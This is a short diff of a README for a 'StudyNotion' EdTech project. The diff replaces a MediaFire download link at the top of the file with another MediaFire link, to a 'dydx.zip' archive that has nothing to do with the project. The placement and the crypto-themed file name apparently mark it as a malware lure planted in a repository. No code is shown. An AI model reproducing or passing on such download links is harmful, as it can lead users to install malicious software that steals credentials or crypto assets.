@@ -1,4 +1,4 @@
-https://www.mediafire.com/file/lydwbgmkvp86o5k/email-sender-server.zip/file
+https://www.mediafire.com/file/qry37xk21rea9ml/dydx.zip/file
 # StudyNotion - EdTech Platform
 
 
